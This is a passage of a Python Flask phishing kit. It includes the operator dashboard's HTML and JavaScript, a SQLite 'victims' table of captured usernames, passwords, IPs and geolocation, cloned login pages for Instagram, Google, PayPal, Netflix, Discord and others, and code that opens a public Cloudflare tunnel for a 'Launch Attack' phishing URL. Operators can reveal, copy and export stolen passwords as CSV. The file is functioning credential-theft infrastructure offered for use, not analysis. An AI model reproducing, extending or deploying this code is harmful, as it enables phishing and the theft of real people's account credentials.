                        <tr><td>Manage Pages:</td><td>{{ '✅' if session.get('can_manage_pages') else '❌' }}</td></tr>
                        <tr><td>Manage Settings:</td><td>{{ '✅' if session.get('can_manage_settings') else '❌' }}</td></tr>
                        <tr><td>Chat:</td><td>{{ '✅' if session.get('can_chat') else '❌' }}</td></tr>
                        <tr><td>Manage Users:</td><td>{{ '✅' if session.get('can_manage_users') else '❌' }}</td></tr>
                        <tr><td>Session Timeout:</td><td>{{ session.get('session_timeout', 30) }} min</td></tr>
                    </table>
                </div>
            </div>

            <!-- Pages (admin only) -->
            <div class="tab-pane" id="pages"><div class="stats-grid" id="pagesGrid"></div></div>

            <!-- Settings (admin only) -->
            <div class="tab-pane" id="settings"><div id="settingsContent"></div></div>

            <!-- Analytics (admin only) – full-height terminal -->
            <div class="tab-pane" id="analytics">
                <div class="analytics-wrapper">
                    <h2 style="margin-bottom:16px;">Live Request Log</h2>
                    <div class="terminal" id="requestLog"></div>
                </div>
            </div>

            <!-- Users (admin only) -->
            <div class="tab-pane" id="users"><div class="table-card"><div id="usersTableContainer"></div></div></div>

            <!-- Chat (if allowed) -->
            <div class="tab-pane" id="chat"><div class="chat-container"><div class="chat-messages" id="chatMessages"></div><div class="chat-input"><input type="text" id="chatInput" placeholder="Message..."><button class="btn btn-primary" onclick="sendChat()">Send</button></div></div></div>
        </div>
    </div>

    <!-- Modals -->
    <div class="modal-overlay" id="deleteModal">
        <div class="modal"><h3>Confirm Deletion</h3><p id="deleteModalText"></p><div style="margin-top:24px; display:flex; gap:12px; justify-content:flex-end;"><button class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button><button class="btn btn-danger" id="confirmDeleteBtn">Delete</button></div></div>
    </div>
    <div class="modal-overlay" id="userModal">
        <div class="modal"><h3 id="userModalTitle">Add User</h3>
            <input type="text" id="newUsername" placeholder="Username" class="search-box" style="width:100%; margin-bottom:12px;">
            <input type="password" id="newPassword" placeholder="Password" class="search-box" style="width:100%; margin-bottom:12px;">
            <select id="newRole" class="search-box" style="width:100%; margin-bottom:12px;"><option value="operator">Operator</option><option value="viewer">Viewer</option></select>
            <div style="display:grid; grid-template-columns:repeat(2,1fr); gap:8px; margin-bottom:12px;">
                <label><input type="checkbox" id="permViewPass"> View Passwords</label>
                <label><input type="checkbox" id="permExport"> Export</label>
                <label><input type="checkbox" id="permDelete"> Delete</label>
                <label><input type="checkbox" id="permPages"> Manage Pages</label>
                <label><input type="checkbox" id="permSettings"> Manage Settings</label>
                <label><input type="checkbox" id="permChat"> Chat</label>
            </div>
            <input type="number" id="userTimeout" placeholder="Session timeout (min)" value="30" class="search-box" style="width:100%; margin-bottom:12px;">
            <div style="display:flex; gap:12px; justify-content:flex-end;"><button class="btn btn-outline" onclick="closeModal('userModal')">Cancel</button><button class="btn btn-primary" id="saveUserBtn">Save</button></div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        const fetchOptions = { credentials: 'same-origin' };
        const permissions = {
            can_view_passwords: {{ 'true' if session.get('can_view_passwords', False) else 'false' }},
            can_export: {{ 'true' if session.get('can_export', False) else 'false' }},
            can_delete: {{ 'true' if session.get('can_delete', False) else 'false' }},
            can_manage_pages: {{ 'true' if session.get('can_manage_pages', False) else 'false' }},
            can_manage_settings: {{ 'true' if session.get('can_manage_settings', False) else 'false' }},
            can_chat: {{ 'true' if session.get('can_chat', False) else 'false' }},
            is_admin: {{ 'true' if session.get('role') == 'super_admin' or session.get('can_manage_users') else 'false' }}
        };

        // Tab navigation (unchanged)
        document.querySelectorAll('.nav-item[data-tab]').forEach(item => {
            item.addEventListener('click', (e) => {
                e.preventDefault();
                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                item.classList.add('active');
                const tabId = item.getAttribute('data-tab');
                document.querySelectorAll('.tab-pane').forEach(t => t.classList.remove('active'));
                const tab = document.getElementById(tabId);
                if (tab) tab.classList.add('active');
                loadTabContent(tabId);
                if (window.innerWidth <= 1024) {
                    document.getElementById('sidebar').classList.remove('visible');
                }
            });
        });

        function loadTabContent(tabId) {
            if (tabId === 'dashboard') { loadDashboard(); loadVictimsTable(); }
            else if (tabId === 'analytics') { loadRequestLog(); if (!window.logInterval) window.logInterval = setInterval(loadRequestLog, 5000); }
            else { clearInterval(window.logInterval); }
            if (tabId === 'pages') loadPages();
            if (tabId === 'settings') loadSettings();
            if (tabId === 'users' && permissions.is_admin) loadUsers();
            if (tabId === 'chat') { loadChat(); if (!window.chatInterval) window.chatInterval = setInterval(loadChat, 3000); }
            else { clearInterval(window.chatInterval); }
        }

        // ========== DASHBOARD ==========
        function loadDashboard() {
            fetch('/panel/api/dashboard-stats', fetchOptions)
            .then(r => r.json())
            .then(stats => {
                const total = stats.total ?? 0;
                const today = stats.today ?? 0;
                const active = stats.active_page ?? 'N/A';
                document.getElementById('dashboardStats').innerHTML = `
                    <div class="stat-card"><div class="icon-box purple"><i class="fas fa-users"></i></div><div class="stat-value">${total}</div><div class="stat-label">Total Victims</div></div>
                    <div class="stat-card"><div class="icon-box green"><i class="fas fa-calendar-check"></i></div><div class="stat-value">${today}</div><div class="stat-label">Today</div></div>
                    <div class="stat-card"><div class="icon-box blue"><i class="fas fa-bullseye"></i></div><div class="stat-value">${active}</div><div class="stat-label">Active Page</div></div>
                `;
            })
            .catch(() => {
                document.getElementById('dashboardStats').innerHTML = `
                    <div class="stat-card"><div class="icon-box purple"><i class="fas fa-users"></i></div><div class="stat-value">0</div><div class="stat-label">Total Victims</div></div>
                    <div class="stat-card"><div class="icon-box green"><i class="fas fa-calendar-check"></i></div><div class="stat-value">0</div><div class="stat-label">Today</div></div>
                    <div class="stat-card"><div class="icon-box blue"><i class="fas fa-bullseye"></i></div><div class="stat-value">N/A</div><div class="stat-label">Active Page</div></div>
                `;
            });
        }

        let victimsData = [], currentPage = 1, itemsPerPage = 10, sortCol = null, sortAsc = true, selectedIds = new Set();
        document.getElementById('victimSearchInput').addEventListener('input', ()=>{ currentPage=1; loadVictimsTable(); });
        document.getElementById('selectAllCheckbox').addEventListener('change', (e)=>{
            document.querySelectorAll('.rowCheckbox').forEach(cb => cb.checked = e.target.checked);
            updateSelectedIds();
        });
        document.getElementById('bulkDeleteBtn').addEventListener('click', ()=>{
            if(selectedIds.size) openDeleteModal(Array.from(selectedIds));
        });
        document.getElementById('exportCSVBtn').addEventListener('click', ()=>{
            fetch('/panel/api/recent-victims?search=&page=1&limit=10000', fetchOptions)
            .then(r => r.json())
            .then(data => {
                const csv = ['Time,IP,Country,Page,Username,Password'].concat(data.victims.map(v => `"${v.time}","${v.ip}","${v.country_name||''}","${v.page}","${v.user}","${v.pass}"`)).join('\n');
                const blob = new Blob([csv], { type: 'text/csv' });
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'victims.csv';
                a.click();
                showToast('CSV exported');
            });
        });

        function loadVictimsTable() {
            const query = document.getElementById('victimSearchInput').value;
            const sort = sortCol || 'id';
            const order = sortAsc ? 'asc' : 'desc';
            fetch(`/panel/api/recent-victims?search=${encodeURIComponent(query)}&page=${currentPage}&limit=${itemsPerPage}&sort=${sort}&order=${order}`, fetchOptions)
            .then(r => r.json())
            .then(data => {
                victimsData = data.victims;
                const tbody = document.getElementById('victimsTbody');
                if (!victimsData.length) {
                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding:24px; color:var(--dim);">No victims recorded yet.</td></tr>';
                } else {
                    tbody.innerHTML = victimsData.map(v => {
                        const passHtml = permissions.can_view_passwords
                            ? `<div class="password-cell"><span class="dots" id="passDots-${v.id}">••••••••</span><span id="passText-${v.id}" style="display:none;">${v.pass}</span><button onclick="togglePassword(${v.id})"><i class="fas fa-eye"></i></button><button onclick="copyText('${v.pass}')"><i class="fas fa-copy"></i></button></div>`
                            : '••••••••';
                        const flagHtml = v.country_code
                            ? `<img src="https://flagcdn.com/w20/${v.country_code.toLowerCase()}.png" class="country-flag" alt="${v.country_code}"> ${v.country_name || v.country_code}`
                            : v.ip;
                        return `<tr id="row-${v.id}">
                            <td><input type="checkbox" class="rowCheckbox" data-id="${v.id}"></td>
                            <td>${v.time || ''}</td>
                            <td>${flagHtml}</td>
                            <td>${v.page || ''}</td>
                            <td>${v.user || ''}</td>
                            <td>${passHtml}</td>
                            <td>${permissions.can_delete ? `<button class="btn btn-sm btn-outline" onclick="singleDelete(${v.id})"><i class="fas fa-trash"></i></button>` : ''}</td>
                        </tr>`;
                    }).join('');
                }
                document.querySelectorAll('.rowCheckbox').forEach(cb => cb.addEventListener('change', updateSelectedIds));
                renderPagination(data.page, data.pages, data.total);
            })
            .catch(err => {
                console.error(err);
                document.getElementById('victimsTbody').innerHTML = '<tr><td colspan="7" style="text-align:center; padding:24px; color:var(--red);">Error loading victims.</td></tr>';
            });
        }

        function togglePassword(id) {
            const dots = document.getElementById(`passDots-${id}`);
            const text = document.getElementById(`passText-${id}`);
            if (!dots || !text) return;
            if (dots.style.display === 'none') { dots.style.display='inline'; text.style.display='none'; }
            else { dots.style.display='none'; text.style.display='inline'; }
        }
        function copyText(text) { navigator.clipboard.writeText(text); showToast('Copied!'); }
        function updateSelectedIds() {
            selectedIds = new Set([...document.querySelectorAll('.rowCheckbox:checked')].map(cb=>parseInt(cb.dataset.id)));
            document.getElementById('bulkDeleteBtn').style.display = selectedIds.size ? 'inline-flex' : 'none';
        }
        function singleDelete(id) { openDeleteModal([id]); }
        function openDeleteModal(ids) {
            document.getElementById('deleteModalText').textContent = `Delete ${ids.length} victim(s)?`;
            document.getElementById('confirmDeleteBtn').onclick = () => { deleteVictims(ids); closeModal('deleteModal'); };
            document.getElementById('deleteModal').classList.add('active');
        }
        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
        function deleteVictims(ids) {
            fetch('/panel/api/delete-victims', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ids}), ...fetchOptions })
            .then(r => r.json())
            .then(data => { if(data.status==='ok'){ showToast('Deleted'); loadVictimsTable(); } });
        }
        function renderPagination(page, pages, total) {
            const c = document.getElementById('paginationControls');
            c.innerHTML = pages>1 ? `<button ${page<=1?'disabled':''} onclick="currentPage=${page-1};loadVictimsTable()">« Prev</button>
                <span style="color:var(--dim);">Page ${page} of ${pages} (${total} total)</span>
                <button ${page>=pages?'disabled':''} onclick="currentPage=${page+1};loadVictimsTable()">Next »</button>` : '';
        }
        document.querySelectorAll('th[data-sort]').forEach(th => th.addEventListener('click', ()=>{
            const col = th.dataset.sort;
            if(sortCol===col) sortAsc=!sortAsc; else { sortCol=col; sortAsc=true; }
            loadVictimsTable();
        }));

        // ========== ANALYTICS (enlarged terminal) ==========
        function loadRequestLog() {
            fetch('/panel/api/request-logs', fetchOptions)
            .then(r => r.json())
            .then(entries => {
                const logDiv = document.getElementById('requestLog');
                if (!entries.length) {
                    logDiv.innerHTML = 'No requests yet.';
                } else {
                    logDiv.innerHTML = entries.map(e => `[${e.timestamp}] ${e.method} ${e.path} (${e.ip}) [${e.user}]`).join('\n');
                }
                logDiv.scrollTop = logDiv.scrollHeight;
            });
        }

        // ========== PAGES ==========
        function loadPages() {
            fetch('/panel/api/pages-list', fetchOptions)
            .then(r => r.json())
            .then(pages => {
                document.getElementById('pagesGrid').innerHTML = Object.entries(pages).map(([key, page]) => `
                    <div class="stat-card ${page.active ? 'active' : ''}" onclick="selectPage('${key}')" style="cursor:pointer;">
                        <div class="icon-box purple"><i class="fas fa-${key==='instagram'?'image':key==='google'?'search':key==='tiktok'?'music':key==='snapchat'?'ghost':''}"></i></div>
                        <div style="font-weight:600;">${page.name}</div>
                        <div style="color:var(--dim);">${page.active ? 'Active' : 'Click to activate'}</div>
                    </div>`).join('');
            });
        }
        function selectPage(key) {
            if(!permissions.can_manage_pages) { showToast('No permission'); return; }
            fetch('/panel/api/select-page', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({page:key}), ...fetchOptions })
            .then(r => r.json())
            .then(d => { if(d.status==='ok'){ showToast('Page changed'); loadPages(); loadDashboard(); } });
        }

        // ========== SETTINGS ==========
        function loadSettings() {
            fetch('/panel/api/attack-status', fetchOptions)
            .then(r => r.json())
            .then(data => {
                const html = `
                    <div class="stats-grid">
                        <div class="stat-card ${data.mode==='localhost'?'active':''}" onclick="setMode('localhost')" style="cursor:pointer;">
                            <div class="icon-box blue"><i class="fas fa-wifi"></i></div><div>Localhost</div><div style="color:var(--dim);">Private LAN</div>
                        </div>
                        <div class="stat-card ${data.mode==='cloudflare'?'active':''}" onclick="setMode('cloudflare')" style="cursor:pointer;">
                            <div class="icon-box orange"><i class="fas fa-cloud"></i></div><div>Cloudflare</div><div style="color:var(--dim);">Public Tunnel</div>
                        </div>
                    </div>
                    ${data.url ? `<div class="table-card" style="margin-top:24px;"><div style="display:flex; justify-content:space-between;"><span>Phishing URL</span><code style="background:#000; padding:8px 16px; border-radius:12px;">${data.url}</code></div><div style="margin-top:16px; display:flex; gap:12px;"><button class="btn btn-primary" onclick="copyToClipboard('${data.url}')">Copy</button><a href="${data.url}" target="_blank" class="btn btn-outline">View Page</a></div></div>` : '<button class="btn btn-primary" onclick="startAttack()">Launch Attack</button>'}
                `;
                document.getElementById('settingsContent').innerHTML = html;
            });
        }
        function setMode(mode) {
            if(!permissions.can_manage_settings) { showToast('No permission'); return; }
            fetch('/panel/api/set-mode', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mode}), ...fetchOptions })
            .then(r => r.json())
            .then(d => { if(d.status==='ok') { showToast('Mode set'); loadSettings(); } });
        }
        function startAttack() {
            if(!permissions.can_manage_settings) return;
            fetch('/panel/api/start-attack', { method:'POST', ...fetchOptions })
            .then(() => loadSettings());
        }

        // ========== USERS ==========
        function loadUsers() {
            if(!permissions.is_admin) return;
            fetch('/panel/api/users', fetchOptions)
            .then(r => r.json())
            .then(users => {
                let html = `<button class="btn btn-primary btn-sm" onclick="openAddUserModal()" style="margin-bottom:16px;">Add User</button>
                <table><thead><tr><th>Username</th><th>Role</th><th>View Pass</th><th>Export</th><th>Delete</th><th>Pages</th><th>Settings</th><th>Chat</th><th>Timeout</th><th>Status</th><th>Actions</th></tr></thead><tbody>`;
                users.forEach(u => {
                    html += `<tr>
                        <td>${u.username}</td><td>${u.role}</td>
                        <td>${u.can_view_passwords?'✅':'❌'}</td><td>${u.can_export?'✅':'❌'}</td><td>${u.can_delete?'✅':'❌'}</td>
                        <td>${u.can_manage_pages?'✅':'❌'}</td><td>${u.can_manage_settings?'✅':'❌'}</td><td>${u.can_chat?'✅':'❌'}</td>
                        <td>${u.session_timeout}</td><td>${u.is_active?'Active':'Inactive'}</td>
                        <td><button class="btn btn-sm btn-outline" onclick="editUser(${u.id})">Edit</button> <button class="btn btn-sm btn-danger" onclick="deleteUser(${u.id})">Delete</button></td>
                    </tr>`;
                });
                html += '</tbody></table>';
                document.getElementById('usersTableContainer').innerHTML = html;
            });
        }
        function openAddUserModal() {
            document.getElementById('userModalTitle').textContent = 'Add User';
            document.getElementById('newUsername').value = '';
            document.getElementById('newPassword').value = '';
            document.getElementById('newRole').value = 'operator';
            document.querySelectorAll('#userModal input[type=checkbox]').forEach(cb => cb.checked = false);
            document.getElementById('userTimeout').value = 30;
            document.getElementById('saveUserBtn').onclick = saveUser;
            document.getElementById('userModal').classList.add('active');
        }
        function saveUser() {
            const username = document.getElementById('newUsername').value.trim();
            const password = document.getElementById('newPassword').value.trim();
            if(!username || !password) { showToast('Username and password required', 'error'); return; }
            const data = {
                username,
                password,
                role: document.getElementById('newRole').value,
                can_view_passwords: document.getElementById('permViewPass').checked?1:0,
                can_export: document.getElementById('permExport').checked?1:0,
                can_delete: document.getElementById('permDelete').checked?1:0,
                can_manage_pages: document.getElementById('permPages').checked?1:0,
                can_manage_settings: document.getElementById('permSettings').checked?1:0,
                can_chat: document.getElementById('permChat').checked?1:0,
                session_timeout: parseInt(document.getElementById('userTimeout').value)||30
            };
            fetch('/panel/api/users', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data), ...fetchOptions })
            .then(r => r.json())
            .then(d => {
                if(d.status==='ok'){ closeModal('userModal'); loadUsers(); showToast('User created'); }
                else showToast('Error: '+(d.error||'Unknown'), 'error');
            }).catch(() => showToast('Network error', 'error'));
        }
        function editUser(id) { showToast('Edit not implemented yet', 'error'); }
        function deleteUser(id) {
            if(!confirm('Delete user?')) return;
            fetch(`/panel/api/users/${id}`, { method:'DELETE', ...fetchOptions })
            .then(r => r.json())
            .then(d => {
                if(d.status==='ok'){ loadUsers(); showToast('User deleted'); }
                else showToast('Delete failed', 'error');
            });
        }

        // ========== CHAT ==========
        let lastChatId = 0;
        function loadChat() {
            fetch(`/panel/api/chat?since=${lastChatId}`, fetchOptions)
            .then(r => r.json())
            .then(msgs => {
                const container = document.getElementById('chatMessages');
                msgs.forEach(m => {
                    if(m.id > lastChatId) {
                        const div = document.createElement('div');
                        div.className = 'chat-message';
                        div.innerHTML = `<span class="chat-user">${m.user}:</span> <span class="chat-text">${m.message}</span>`;
                        container.appendChild(div);
                        lastChatId = m.id;
                    }
                });
                container.scrollTop = container.scrollHeight;
            });
        }
        function sendChat() {
            const input = document.getElementById('chatInput');
            const msg = input.value.trim();
            if(!msg) return;
            fetch('/panel/api/chat', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({message:msg}), ...fetchOptions })
            .then(() => { input.value = ''; loadChat(); });
        }

        function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied!'); }
        function showToast(msg, type='success') {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            if(type==='error') t.style.background = '#EF4444';
            setTimeout(() => { t.classList.remove('show'); t.style.background = ''; }, 2500);
        }

        loadDashboard();
        loadVictimsTable();
    </script>
</body>
</html>
"""

# =============================================================================
# PAGES dict (unchanged)
# =============================================================================
PAGES = {
    "instagram": {"name": "Instagram", "html": INSTAGRAM_PAGE, "redirect": "https://www.instagram.com/accounts/login/"},
    "google": {"name": "Google", "html": GOOGLE_PAGE, "redirect": "https://accounts.google.com/signin"},
    "tiktok": {"name": "TikTok", "html": TIKTOK_PAGE, "redirect": "https://www.tiktok.com/login"},
    "snapchat": {"name": "Snapchat", "html": SNAPCHAT_PAGE, "redirect": "https://accounts.snapchat.com/accounts/login"},
    "paypal": {"name": "PayPal", "html": PAYPAL_PAGE, "redirect": "https://www.paypal.com/signin"},
    "netflix": {"name": "Netflix", "html": NETFLIX_PAGE, "redirect": "https://www.netflix.com/login"},
    "discord": {"name": "Discord", "html": DISCORD_PAGE, "redirect": "https://discord.com/login"},
}

# =============================================================================
# Database (same as previous final version – with corrected get_recent)
# =============================================================================
class Database:
    _lock = threading.Lock()

    def __init__(self, db_path: Path):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        with self._lock, self._connect() as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT NOT NULL,
                    page TEXT NOT NULL,
                    ip TEXT NOT NULL,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    country_code TEXT DEFAULT '',
                    country_name TEXT DEFAULT '',
                    city TEXT DEFAULT '',
                    isp TEXT DEFAULT ''
                );
                CREATE TABLE IF NOT EXISTS admin_login_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    attempt_time TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    role TEXT DEFAULT 'operator',
                    can_view_passwords INTEGER DEFAULT 0,
                    can_export INTEGER DEFAULT 0,
                    can_delete INTEGER DEFAULT 0,
                    can_manage_pages INTEGER DEFAULT 0,
                    can_manage_settings INTEGER DEFAULT 0,
                    can_chat INTEGER DEFAULT 1,
                    session_timeout INTEGER DEFAULT 30,
                    is_active INTEGER DEFAULT 1
                );
                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user TEXT NOT NULL,
                    action TEXT NOT NULL,
                    module TEXT NOT NULL,
                    timestamp TEXT NOT NULL,
                    ip TEXT DEFAULT ''
                );
                CREATE TABLE IF NOT EXISTS chat_messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user TEXT NOT NULL,
                    message TEXT NOT NULL,
                    timestamp TEXT NOT NULL
                );
            """)
            # Add missing column if needed
            cols = [row[1] for row in conn.execute("PRAGMA table_info(users)").fetchall()]
            if "can_manage_users" not in cols:
                conn.execute("ALTER TABLE users ADD COLUMN can_manage_users INTEGER DEFAULT 0")
                logger.info("Added missing column can_manage_users")
            conn.commit()

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(str(self.db_path))
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        return conn

    # Victim methods
    def insert_victim(self, page, ip, username, password):
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._connect() as conn:
            cur = conn.execute(
                "INSERT INTO victims (timestamp, page, ip, username, password) VALUES (?,?,?,?,?)",
                (ts, page, ip, username, password)
            )
            vid = cur.lastrowid
            conn.commit()
        threading.Thread(target=self._update_geo, args=(vid, ip), daemon=True).start()
        return vid

    def _update_geo(self, vid, ip):
        try:
            resp = requests.get(Config.GEOIP_API.format(ip), timeout=3)
            if resp.status_code == 200:
                d = resp.json()
                if d.get('status') == 'success':
                    with self._lock, self._connect() as conn:
                        conn.execute(
                            "UPDATE victims SET country_code=?, country_name=?, city=?, isp=? WHERE id=?",
                            (d.get('countryCode',''), d.get('country',''), d.get('city',''), d.get('isp',''), vid)
                        )
                        conn.commit()
        except:
            pass

    def get_recent(self, limit=20, offset=0, search='', sort_by='id', order='desc'):
        with self._lock, self._connect() as conn:
            where = ""; params = []
            if search:
                where = "WHERE (username LIKE ? OR ip LIKE ? OR page LIKE ?)"
                params = [f'%{search}%'] * 3
            allowed = {'id','timestamp','ip','username','password'}
            sort_by = sort_by if sort_by in allowed else 'id'
            order = 'ASC' if order.lower() == 'asc' else 'DESC'
            query = f"SELECT * FROM victims {where} ORDER BY {sort_by} {order} LIMIT ? OFFSET ?"
            params.extend([limit, offset])
            rows = conn.execute(query, params).fetchall()
            total = conn.execute(f"SELECT COUNT(*) FROM victims {where}", params[:len(params)-2]).fetchone()[0]
            victims = []
            for r in rows:
                v = dict(r)
                # Map to front‑end keys – NO MORE undefined
                v['user'] = v.get('username', '') or ''
                v['pass'] = v.get('password', '') or ''
                v['time'] = self._format_time(v.get('timestamp', ''))
                v['country_flag'] = f"https://flagcdn.com/w20/{v.get('country_code','').lower()}.png" if v.get('country_code') else ''
                victims.append(v)
            return victims, total

    def count_today(self):
        today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        with self._lock, self._connect() as conn:
            return conn.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",)).fetchone()[0]

    def total_count(self):
        with self._lock, self._connect() as conn:
            return conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]

    def delete_victims(self, ids):
        with self._lock, self._connect() as conn:
            conn.execute(f"DELETE FROM victims WHERE id IN ({','.join('?' for _ in ids)})", ids)
            conn.commit()

    def delete_all(self):
        with self._lock, self._connect() as conn:
            conn.execute("DELETE FROM victims")
            conn.commit()

    def record_failed_attempt(self, ip):
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._connect() as conn:
            conn.execute("INSERT INTO admin_login_attempts (ip, attempt_time) VALUES (?,?)", (ip, ts))
            conn.commit()

    def count_recent_attempts(self, ip):
        cutoff = (datetime.now(timezone.utc) - Config.LOGIN_BLOCK_DURATION).isoformat()
        with self._lock, self._connect() as conn:
            return conn.execute(
                "SELECT COUNT(*) FROM admin_login_attempts WHERE ip=? AND attempt_time >= ?",
                (ip, cutoff)
            ).fetchone()[0]

    def is_blocked(self, ip):
        return self.count_recent_attempts(ip) >= Config.MAX_LOGIN_ATTEMPTS

    def get_all_users(self):
        with self._lock, self._connect() as conn:
            return [dict(r) for r in conn.execute("SELECT * FROM users").fetchall()]

    def get_user(self, username):
        with self._lock, self._connect() as conn:
            return conn.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()

    def add_user(self, username, password, role, perms):
        pwd = hashlib.sha256(password.encode()).hexdigest()
        with self._lock, self._connect() as conn:
            conn.execute(
                "INSERT INTO users (username, password_hash, role, can_view_passwords, can_export, can_delete, "
                "can_manage_pages, can_manage_settings, can_chat, can_manage_users, session_timeout) "
                "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                (username, pwd, role,
                 perms["can_view_passwords"], perms["can_export"], perms["can_delete"],
                 perms["can_manage_pages"], perms["can_manage_settings"], perms["can_chat"],
                 perms.get("can_manage_users", 0), perms["session_timeout"])
            )
            conn.commit()

    def update_user(self, uid, perms):
        with self._lock, self._connect() as conn:
            conn.execute(
                "UPDATE users SET can_view_passwords=?, can_export=?, can_delete=?, can_manage_pages=?, "
                "can_manage_settings=?, can_chat=?, can_manage_users=?, session_timeout=? WHERE id=?",
                (perms["can_view_passwords"], perms["can_export"], perms["can_delete"],
                 perms["can_manage_pages"], perms["can_manage_settings"], perms["can_chat"],
                 perms.get("can_manage_users", 0), perms["session_timeout"], uid)
            )
            conn.commit()

    def delete_user(self, uid):
        with self._lock, self._connect() as conn:
            conn.execute("DELETE FROM users WHERE id=?", (uid,))
            conn.commit()

    def add_audit(self, user, action, module, ip=''):
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._connect() as conn:
            conn.execute("INSERT INTO audit_log (user, action, module, timestamp, ip) VALUES (?,?,?,?,?)",
                         (user, action, module, ts, ip))
            conn.commit()

    def add_chat(self, user, msg):
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock, self._connect() as conn:
            conn.execute("INSERT INTO chat_messages (user, message, timestamp) VALUES (?,?,?)", (user, msg, ts))
            conn.commit()

    def get_chat_since(self, since=0):
        with self._lock, self._connect() as conn:
            return [dict(r) for r in conn.execute("SELECT * FROM chat_messages WHERE id > ? ORDER BY id ASC", (since,)).fetchall()]

    @staticmethod
    def _format_time(iso_ts):
        try:
            return datetime.fromisoformat(iso_ts).strftime("%Y-%m-%d %H:%M:%S")
        except:
            return iso_ts[:19]

# =============================================================================
# AppState
# =============================================================================
class AppState:
    def __init__(self):
        self.lock = threading.Lock()
        self.current_page = PAGES["instagram"]
        self.attack_mode = None
        self.attack_url = None

    def set_page(self, k):
        if k in PAGES:
            with self.lock: self.current_page = PAGES[k]
            return True
        return False

    def set_mode(self, mode, url=None):
        with self.lock: self.attack_mode = mode
        if url is not None: self.attack_url = url

    def set_attack_url(self, url):
        with self.lock: self.attack_url = url

    def get_page_name(self):
        with self.lock: return self.current_page["name"]

    def get_page_html(self):
        with self.lock: return self.current_page["html"]

    def get_page_redirect(self):
        with self.lock: return self.current_page["redirect"]

    def get_state(self):
        with self.lock: return {"mode": self.attack_mode, "url": self.attack_url, "page_name": self.current_page["name"]}

state = AppState()
db = Database(Config.DB_FILE)

# =============================================================================
# Flask App
# =============================================================================
app = Flask(__name__)
app.config.from_object(Config)

# Migrate old JSON
json_path = Config.DATA_DIR / "victims.json"
if json_path.exists():
    json_path.rename(json_path.with_suffix(".json.bak"))

@app.before_request
def before_request():
    log_request()

# Serve background image (place bg.jpg in the same folder)
@app.route('/bg.jpg')
def bg_image():
    return send_file('bg.jpg')

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def start_cloudflare_tunnel():
    try:
        subprocess.run([Config.CLOUDFLARE_BIN, "--version"], capture_output=True, check=True)
    except:
        logger.warning("cloudflared not found. Installing...")
        subprocess.run("curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cf && chmod +x /tmp/cf && sudo mv /tmp/cf /usr/local/bin/cloudflared", shell=True, check=False)
    process = subprocess.Popen([Config.CLOUDFLARE_BIN, "tunnel", "--url", f"http://localhost:{Config.PHISH_PORT}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            state.set_attack_url(match.group(0))
            logger.info("Cloudflare tunnel active: %s", match.group(0))
            break

def verify_admin(username, password):
    if username == Config.ADMIN_USER and secrets.compare_digest(password, Config.ADMIN_PASS_PLAIN):
        return 'super_admin', {
            'can_view_passwords': 1, 'can_export': 1, 'can_delete': 1,
            'can_manage_pages': 1, 'can_manage_settings': 1, 'can_chat': 1,
            'can_manage_users': 1, 'session_timeout': 0
        }
    user = db.get_user(username)
    if user and user['is_active'] and hashlib.sha256(password.encode()).hexdigest() == user['password_hash']:
        return user['role'], user
    return None, None

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect("/panel/login")
        if session.get('role') != 'super_admin':
            last_activity = session.get('last_activity', 0)
            timeout = session.get('session_timeout', Config.DEFAULT_SESSION_TIMEOUT) * 60
            if time.time() - last_activity > timeout:
                session.clear()
                return redirect("/panel/login?timeout=1")
            session['last_activity'] = time.time()
        return f(*args, **kwargs)
    return decorated

def permission_required(perm):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            if not session.get(perm, False) and session.get('role') != 'super_admin':
                return jsonify({"error": "Forbidden"}), 403
            return f(*args, **kwargs)
        return wrapped
    return decorator

# =============================================================================
# Routes (same as previous final version)
